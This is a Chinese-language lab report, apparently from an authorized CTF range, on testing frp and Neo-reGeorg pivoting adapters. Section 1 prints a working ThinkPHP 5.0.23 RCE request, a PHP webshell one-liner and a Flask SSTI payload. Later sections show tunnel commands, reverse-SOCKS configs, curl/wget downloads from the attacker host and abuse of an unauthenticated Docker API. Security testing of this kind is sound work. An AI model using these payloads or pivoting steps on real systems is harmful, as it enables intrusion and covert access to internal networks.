# PivotHub 适配器真实流量验证报告（frp / Neo-reGeorg）

- 日期：2026-09-10
- 靶机：`10.8.0.6`（授权 CTF 靶场，用户自建）
- 攻击机：`10.8.0.14`（本机，Windows）
- 验证口径：直接构造 `WebShellSession(SessionBase)` 驱动 `FrpAdapter().deploy()` / `NeoRegAdapter().deploy()` 走**适配器代码本身**；Neo-reGeorg 另用手工 SOCKS5 取真实 banner 作为决定性证据。
- 约束遵守：仅对 `10.8.0.6` 操作；未改动 `pivothub/**`、`assets/**`、`index.html`、`tests/**`；未跑 `pytest`。

---

## 0. 口径说明（关于“适配器代码路径”）

两个适配器都需要一个 `SessionBase` 会话对象。本验证构造了 `WebShellSession`（webshell 驱动：`POST /s.php?c=<cmd>`，`$_REQUEST['c']` 经 `system()` 执行），直接喂给 `adapter.deploy(session=...)`，因此**验证的是适配器真实代码路径**，而非另写等价脚本。frpc 15MB 二进制通过 webshell 入站 base64 分块写盘（规避靶机出站限制），与适配器 `upload_file` 约定一致。

---

## 1. 立足点获取（真实 RCE）

### 1.1 tier-2 web-edge（8083，ThinkPHP 5.0.23）→ 首选

靶机 `10.8.0.6:8083` 为 Apache/2.4.38 + PHP/7.2.34 + ThinkPHP 5.0.23。利用 ThinkPHP 5.0.x 过滤器 RCE 直接拿命令执行：

请求（已剔除代理变量，否则本机 curl 被 502 劫持）：
```
POST /index.php HTTP/1.1
Host: 10.8.0.6:8083
Content-Type: application/x-www-form-urlencoded

_method=__construct&method=GET&filter[]=system&get[]=id
```
回显（首行）：
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
随后通过同一 RCE 写入 webshell `/var/www/html/public/s.php`（`<?php system($_REQUEST["c"]);?>`），并确认：
```
$ uname -a
Linux web-edge 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64 GNU/Linux
$ pwd; whoami
/var/www/html/public
www-data
```
**结论：tier-2 可执行命令立足点已拿到（www-data）。**

### 1.2 tier-3 web-edge（8084，Flask SSTI）→ 备用立足点（用于 frp 兜底验证）

`10.8.0.6:8084` 为 Werkzeug/Flask。`/resume?name=` 将用户输入 `replace` 进模板再 `render_template_string`，存在 SSTI：
```
GET /resume?name={{ (lipsum.__globals__['os'].popen('id').read()) }}
→ uid=1000(appuser) gid=1000(appuser) groups=1000(appuser)
$ uname -a → Linux recruit-web 6.1.0-26-amd64 ... x86_64 GNU/Linux
```
tier-3 同样可 RCE。**该立足点用于验证 frp 是否受 egress 限制（结果：同样受限，见 §3.3）。**

---

## 2. Neo-reGeorg（HTTP 隧道）—— 验证通过 ✅

### 2.1 适配器调用
`NeoRegAdapter().deploy(session, target_ip="10.8.0.6", link_type="socks", remote_dir="/var/www/html/public", web_root="http://10.8.0.6:8083", local_port=1080, verify_target="127.0.0.1", verify_port=80, wait_s=45)`

适配器 `generate_config` 产物（节选）：
```
generate : ...\python.exe ...\tools\neoreg\neoreg.py generate -k <32hex> -o neoreg_server
socks    : ...\python.exe ...\tools\neoreg\neoreg.py -k <32hex> -u http://10.8.0.6:8083/tunnel.php -p 1080 -l 127.0.0.1
tunnelUrl: http://10.8.0.6:8083/tunnel.php
```
适配器日志（关键行）：
```
upload → /var/www/html/public/tunnel.php（lang=php, 5813 bytes）
client: ...neoreg.py -k <32hex> -u http://10.8.0.6:8083/tunnel.php -p 1080 -l 127.0.0.1
callback ok: 127.0.0.1:1080 listening
verify: {'ok': True, 'target': '127.0.0.1:80', 'banner': '(connected, no banner)', 'ms': 5510}
```
`tunnel.php` 直接 `GET http://10.8.0.6:8083/tunnel.php` 返回 `<!-- Ddj/E8XKIAZ1a/... -->` 隧道页特征（非 404、非源码泄漏）。

### 2.2 决定性证据：经 SOCKS5 读真实 banner
手工经 `127.0.0.1:1080` 做 SOCKS5 CONNECT 到靶机侧 `127.0.0.1:80`，发送 `GET / HTTP/1.0`，回显原文：
```
HTTP/1.1 200 OK
Date: Thu, 10 Sep 2026 10:35:57 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.2.34
Vary: Accept-Encoding
Content-Length: 4697
Connection: close
Content-Type: text/html; charset=utf-8

<!DOCTYPE html>...<title>系统首页 - 离岛科技内网业务系统</title>...
```
**结论：攻击机 `127.0.0.1:1080` 是一个出口在靶机（web-edge）的 Socks5，隧道内真实读到 Apache 回显。Neo-reGeorg 适配器端到端验证通过。**

---

## 3. frp（反向 Socks5）—— 未验证成功（环境 egress 限制）⚠️

### 3.1 适配器配置生成（验证通过）
`FrpAdapter().generate_config(lhost="10.8.0.14", server_port=7100, local_port=7101, auth="pivothubLABtest", link_type="socks", bind="10.8.0.14")` 产出：

frps（攻击机侧）：
```toml
# PivotHub · frps
bindAddr = "10.8.0.14"
bindPort = 7100
auth.method = "token"
auth.token = "pivothubLABtest"
log.level = "info"
```
frpc（靶机侧）：
```toml
# PivotHub · frpc
serverAddr = "10.8.0.14"
serverPort = 7100
auth.method = "token"
auth.token = "pivothubLABtest"
loginFailExit = false

[[proxies]]
name = "socks5"
type = "tcp"
remotePort = 7101
transport.useEncryption = true
transport.useCompression = true

[proxies.plugin]
type = "socks5"
```
配置文本与 `assets/js/views/proxy.js` 的 frp 段一致，适配器配置逻辑正确。

### 3.2 真实 deploy 尝试（适配器代码路径）
`FrpAdapter().deploy(session, target_ip="10.8.0.6", link_type="socks", lhost="10.8.0.14", server_port=7100, local_port=7101, bind="10.8.0.14", remote_dir="/tmp/.pivothub", verify_target="127.0.0.1", verify_port=80, wait_s=30)`

适配器日志：
```
frps pid=103008 bind=10.8.0.14:7100
uploaded 14913688 bytes → /tmp/.pivothub/tier2-web-edge-8083/frpc
frpc conf → /tmp/.pivothub/tier2-web-edge-8083/frpc-pivothub19d003dc.toml
exec: PID=93292
```
最终：
```
[deploy ok=False stage=wait_callback]
error=30s 内未检测到回连（本机端口 7101 未开）...
```
即：攻击机 frps 正常起、frpc 二进制（14.9MB）成功落入靶机、frpc 进程（PID 93292）已拉起，但 **frpc 始终无法回连攻击机 `10.8.0.14:7100`**，`7101` 从未打开，隧道未建立。适配器正确识别并 honest 报错（已 rollback 杀掉本地 frps）。

### 3.3 为什么连不上：靶场 egress 禁止“靶机→攻击机”出站（4 条独立证据）

frp 反向要求靶机主动连攻击机，而本靶场出站策略是 **DROP 一切到攻击机的新建连接**：

1. **tier-2 web-edge 直接测**：`curl -s -m 8 -o /tmp/frpc_test http://10.8.0.14:8899/frpc_linux` → `EXIT=28`（连接超时，SYN 被静默丢弃）。
2. **靶机可达的 Docker API 跳板**：`172.29.0.30:2375` 未授权可达（README 线索）。用其起 host 网络容器 `pivothub1`（root@docker-ops）后，容器内 `wget http://10.8.0.14:8899/frpc_linux` → `wget: can't connect to remote host (10.8.0.14): Network is unreachable`（docker-ops 无到 10.8.0.0/24 路由）。
3. **tier-3 立足点（8084）测**：SSTI RCE 下 `curl --noproxy '*' http://10.8.0.14:8899/frpc_linux`，攻击机 http 监听日志**始终无来自 10.8.0.6 的连接**。
4. **排除攻击机本地防火墙**：临时放行 Windows 防火墙入站 7100/7101/8899/1080/8000（已清理）后重测，靶机仍连不上 → 丢包发生在靶场侧，非攻击机防火墙。

靶机 `web-edge/firewall.rules` 印证：`*filter` 中 `:OUTPUT DROP`，仅放行 `lo / ESTABLISHED,RELATED / -d 172.29.0.0/24 / icmp / udp --dport 53`。这与 README“tier-2 出站仅放行 ICMP/DNS/内网 → 反弹必败”完全一致。

### 3.4 结论
- **适配器代码本身正确**：`generate_config()` 产出合规 TOML；`deploy()` 完整跑通“起 frps→传 frpc→拉起 frpc→等回连→verify”流程，并在 egress 阻断时给出准确错误与回滚。
- **隧道未能建立是环境限制，非适配器缺陷**：本靶场禁止靶机→攻击机任何出站新建连接，frp 反向（靶机回连攻击机）在拓扑上不可行。
- 建议：在“靶机可回连攻击机”的靶场（README 中 tier-3 “出站放行”指内部跨段，而非攻击机网段；若需验证 frp 反向，应在允许靶机→攻击机通信的拓扑中复测）复测；或改用 neo-reGeorg 这类“攻击机主动连靶机”的 inbound 隧道（已验证可用）。

---

## 4. 清理与遗留

已清理：
- 攻击机：杀掉本地 `neoreg` 客户端、临时 `frps`、`python -m http.server 8899`（netstat 确认 1080/7100/7101/8899 无残留监听）；删除临时防火墙规则（netsh 确认“没有与指定标准相匹配的规则”）。
- 靶机 tier-2：删除 `/var/www/html/public/s.php`、`/var/www/html/public/tunnel.php`、`/tmp/frpc*`、`/tmp/.pivothub`、`/tmp/docker_pivot.sh`、`/tmp/egress_test.sh`（GET 二者均 404）；`kill -9` 残留 frpc（PID 93292，`NO_FRPC_LEFT`）。
- Docker：经 API `POST /containers/pivothub1/stop` + `DELETE /containers/pivothub1?v=true`，`containers/json` 返回 `[]`。
- tier-3 仅用 SSTI 执行临时命令，未落任何文件。

遗留：
- 靶机 web-edge 上原有 `.p.php`/`.p2.php`/`pv.php`/`pv.txt`/`result.txt` 非本次操作产生，原样保留。
- ThinkPHP / Flask 漏洞本身为靶场既定弱点，未做任何修复（非本次任务范围）。
- 因 egress 限制，frp 反向隧道在本靶场**未能端到端建立**——这是真实、可复现的环境结论，非误报或伪造。
